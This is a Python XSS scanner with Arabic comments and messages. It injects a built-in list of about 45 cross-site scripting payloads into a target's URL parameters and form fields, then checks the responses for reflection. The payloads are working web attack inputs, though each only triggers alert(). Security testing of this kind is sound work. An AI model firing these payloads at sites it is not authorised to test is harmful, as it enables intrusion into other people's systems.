#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import logging
import requests
from urllib.parse import urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from colorama import Fore, Style
from tqdm import tqdm

from urlget.utils import setup_logger

class XSSScanner:
    """فئة لاختبار ثغرات XSS والثغرات المماثلة"""
    
    def __init__(self, url, payloads_file=None, params=None, verbose=False):
        """تهيئة الماسح"""
        self.url = url
        self.payloads_file = payloads_file
        self.params = params.split(',') if params else None
        self.verbose = verbose
        
        # إعداد السجل
        self.logger = setup_logger("XSSScanner", level=logging.DEBUG if verbose else logging.INFO)
        
        # قوائم لتخزين البيانات
        self.payloads = []
        self.results = []
        self.vulnerable_params = []
    
    def load_payloads(self):
        """تحميل حمولات XSS من ملف أو استخدام الحمولات الافتراضية"""
        if self.payloads_file and os.path.exists(self.payloads_file):
            try:
                with open(self.payloads_file, 'r', encoding='utf-8') as f:
                    self.payloads = [line.strip() for line in f if line.strip()]
                self.logger.info(f"تم تحميل {len(self.payloads)} حمولة XSS من الملف")
            except Exception as e:
                self.logger.error(f"فشل في تحميل حمولات XSS من الملف: {str(e)}")
                self._use_default_payloads()
        else:
            self._use_default_payloads()
    
    def _use_default_payloads(self):
        """استخدام حمولات XSS الافتراضية"""
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "\"><script>alert('XSS')</script>",
            "';alert('XSS');//",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;\">",
            "<img src=x:alert(alt) onerror=eval(src) alt='XSS'>",
            "\"><img src=x onerror=alert('XSS')>",
            "<script>document.write('<img src=\"x\" onerror=\"alert(\\'XSS\\')\"/>')</script>",
            "<script>/* */alert('XSS')/* */</script>",
            "<script>alert(/XSS/)</script>",
            "<script src=data:text/javascript,alert('XSS')></script>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><animate onbegin=alert('XSS') attributeName=x></animate>",
            "<title onpropertychange=alert('XSS')></title><title title=x>",
            "<a href=javascript:alert('XSS')>XSS</a>",
            "<a href=\"javascript:alert('XSS')\">XSS</a>",
            "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">XSS</a>",
            "<div style=\"background-image: url(javascript:alert('XSS'))\">",
            "<div style=\"width: expression(alert('XSS'))\">",
            "<div onmouseover=\"alert('XSS')\">XSS</div>",
            "<div onclick=\"alert('XSS')\">Click me</div>",
            "<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\">",
            "<input type=\"text\" value=\"\" onblur=\"alert('XSS')\">",
            "<input type=\"text\" value=\"\" onkeyup=\"alert('XSS')\">",
            "<input autofocus onfocus=alert('XSS')>",
            "<select onchange=alert('XSS')><option>1</option><option>2</option></select>",
            "<textarea onkeyup=\"alert('XSS')\"></textarea>",
            "<video><source onerror=\"javascript:alert('XSS')\">",
            "<audio src=x onerror=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<form><button formaction=javascript:alert('XSS')>XSS</button>",
            "<form><input formaction=javascript:alert('XSS') type=submit value=XSS>",
            "<form id=test onforminput=alert('XSS')><input></form><button form=test onformchange=alert('XSS')>XSS</button>",
            "<object data=\"javascript:alert('XSS')\"></object>",
            "<embed src=\"javascript:alert('XSS')\"></embed>",
            "<script>{{constructor.constructor('alert(\"XSS\")')()}}</script>",
            "<script>setTimeout('alert(\"XSS\")',500)</script>",
            "<svg><set attributeName=\"onmouseover\" to=\"alert('XSS')\" /><animate attributeName=\"onmouseover\" to=\"alert('XSS')\" /><script>alert('XSS')</script></svg>"
        ]
        self.logger.info(f"استخدام {len(self.payloads)} حمولة XSS افتراضية")
    
    def parse_url(self):
        """تحليل عنوان URL واستخراج المعلمات"""
        parsed_url = urlparse(self.url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        params = parse_qs(parsed_url.query)
        
        return base_url, params
    
    def extract_forms(self, url):
        """استخراج النماذج من صفحة الويب"""
        self.logger.info(f"استخراج النماذج من: {url}")
        
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'lxml')
            
            forms = []
            for form in soup.find_all('form'):
                form_details = {}
                form_details['action'] = form.get('action', '').strip() or url
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_type = input_tag.get('type', 'text')
                    input_name = input_tag.get('name', '')
                    input_value = input_tag.get('value', '')
                    
                    if input_name:
                        form_details['inputs'].append({
                            'type': input_type,
                            'name': input_name,
                            'value': input_value
                        })
                
                forms.append(form_details)
            
            return forms
            
        except Exception as e:
            self.logger.error(f"خطأ أثناء استخراج النماذج: {str(e)}")
            return []
    
    def scan_url_params(self):
        """فحص معلمات URL للبحث عن ثغرات XSS"""
        base_url, params = self.parse_url()
        
        if not params:
            self.logger.warning("لم يتم العثور على معلمات في عنوان URL")
            return []
        
        vulnerable_params = []
        
        # تحديد المعلمات المستهدفة
        target_params = self.params if self.params else params.keys()
        
        for param_name in target_params:
            if param_name not in params:
                self.logger.warning(f"المعلمة '{param_name}' غير موجودة في عنوان URL")
                continue
            
            self.logger.info(f"فحص المعلمة: {param_name}")
            
            for payload in tqdm(self.payloads, desc=f"فحص {param_name}", disable=not self.verbose):
                # نسخ المعلمات الأصلية
                new_params = {k: v[0] if isinstance(v, list) and len(v) > 0 else v for k, v in params.items()}
                
                # استبدال قيمة المعلمة بالحمولة
                new_params[param_name] = payload
                
                # إنشاء عنوان URL الجديد
                query_string = urlencode(new_params, doseq=True)
                test_url = f"{base_url}?{query_string}"
                
                try:
                    response = requests.get(test_url, timeout=10)
                    
                    # التحقق من وجود الحمولة في الاستجابة
                    if self._check_xss_reflection(response.text, payload):
                        vuln = {
                            'param_name': param_name,
                            'payload': payload,
                            'url': test_url,
                            'type': 'reflected'
                        }
                        vulnerable_params.append(vuln)
                        
                        print(f"{Fore.RED}[!] تم العثور على ثغرة XSS محتملة!{Style.RESET_ALL}")
                        print(f"  المعلمة: {param_name}")
                        print(f"  الحمولة: {payload}")
                        print(f"  URL: {test_url}")
                        print(f"  النوع: منعكس (Reflected)")
                        
                        # تجنب اختبار المزيد من الحمولات لهذه المعلمة
                        break
                        
                except requests.exceptions.RequestException as e:
                    self.logger.error(f"خطأ أثناء اختبار المعلمة {param_name}: {str(e)}")
        
        return vulnerable_params
    
    def scan_forms(self):
        """فحص النماذج للبحث عن ثغرات XSS"""
        forms = self.extract_forms(self.url)
        
        if not forms:
            self.logger.warning("لم يتم العثور على نماذج في الصفحة")
            return []
        
        vulnerable_forms = []
        
        for form in forms:
            self.logger.info(f"فحص النموذج: {form['action']} ({form['method']})")
            
            for input_field in form['inputs']:
                # تجاهل الحقول المخفية والأزرار
                if input_field['type'] in ['hidden', 'submit', 'button', 'image']:
                    continue
                
                input_name = input_field['name']
                
                # تحديد المعلمات المستهدفة
                if self.params and input_name not in self.params:
                    continue
                
                self.logger.info(f"فحص الحقل: {input_name}")
                
                for payload in tqdm(self.payloads, desc=f"فحص {input_name}", disable=not self.verbose):
                    # إنشاء بيانات النموذج
                    data = {}
                    for inp in form['inputs']:
                        if inp['type'] not in ['submit', 'button', 'image']:
                            if inp['name'] == input_name:
                                data[inp['name']] = payload
                            else:
                                data[inp['name']] = inp['value'] or "test"
                    
                    try:
                        if form['method'] == 'post':
                            response = requests.post(form['action'], data=data, timeout=10)
                        else:
                            response = requests.get(form['action'], params=data, timeout=10)
                        
                        # التحقق من وجود الحمولة في الاستجابة
                        if self._check_xss_reflection(response.text, payload):
                            vuln = {
                                'form_action': form['action'],
                                'form_method': form['method'],
                                'input_name': input_name,
                                'payload': payload,
                                'type': 'reflected'
                            }
                            vulnerable_forms.append(vuln)
                            
                            print(f"{Fore.RED}[!] تم العثور على ثغرة XSS محتملة في النموذج!{Style.RESET_ALL}")
                            print(f"  النموذج: {form['action']} ({form['method']})")
                            print(f"  الحقل: {input_name}")
                            print(f"  الحمولة: {payload}")
                            print(f"  النوع: منعكس (Reflected)")
                            
                            # تجنب اختبار المزيد من الحمولات لهذا الحقل
                            break
                            
                    except requests.exceptions.RequestException as e:
                        self.logger.error(f"خطأ أثناء اختبار الحقل {input_name}: {str(e)}")
        
        return vulnerable_forms
    
    def _check_xss_reflection(self, response_text, payload):
        """التحقق من وجود الحمولة في الاستجابة"""
        # إزالة الأجزاء غير المهمة من الحمولة للتحقق
        clean_payload = re.sub(r'[\'"`()]', '', payload)
        
        # البحث عن الحمولة في الاستجابة
        if clean_payload in response_text:
            # التحقق من أن الحمولة موجودة في سياق HTML
            soup = BeautifulSoup(response_text, 'lxml')
            
            # البحث عن علامات script تحتوي على الحمولة
            for script in soup.find_all('script'):
                if clean_payload in script.text:
                    return True
            
            # البحث عن سمات تحتوي على الحمولة
            for tag in soup.find_all(lambda t: any(clean_payload in attr for attr in t.attrs.values() if isinstance(attr, str))):
                return True
            
            # البحث عن نص يحتوي على الحمولة
            if soup.find(text=lambda t: clean_payload in t):
                return True
        
        return False
    
    def start(self):
        """بدء عملية فحص XSS"""
        print(f"{Fore.GREEN}[+] بدء فحص ثغرات XSS...{Style.RESET_ALL}")
        
        # تحميل الحمولات
        self.load_payloads()
        
        # فحص معلمات URL
        url_vulnerabilities = self.scan_url_params()
        
        # فحص النماذج
        form_vulnerabilities = self.scan_forms()
        
        # جمع النتائج
        vulnerabilities = url_vulnerabilities + form_vulnerabilities
        
        # عرض النتائج
        print(f"\n{Fore.GREEN}[+] اكتمل فحص XSS!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] تم العثور على {len(vulnerabilities)} ثغرات XSS محتملة{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"\n{Fore.YELLOW}[!] ثغرات XSS المحتملة:{Style.RESET_ALL}")
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"  {i}. نوع: {vuln['type']}")
                if 'param_name' in vuln:
                    print(f"     المعلمة: {vuln['param_name']}")
                    print(f"     URL: {vuln['url']}")
                else:
                    print(f"     النموذج: {vuln['form_action']} ({vuln['form_method']})")
                    print(f"     الحقل: {vuln['input_name']}")
                print(f"     الحمولة: {vuln['payload']}")
                print()
        
        return {
            'vulnerabilities': vulnerabilities
        }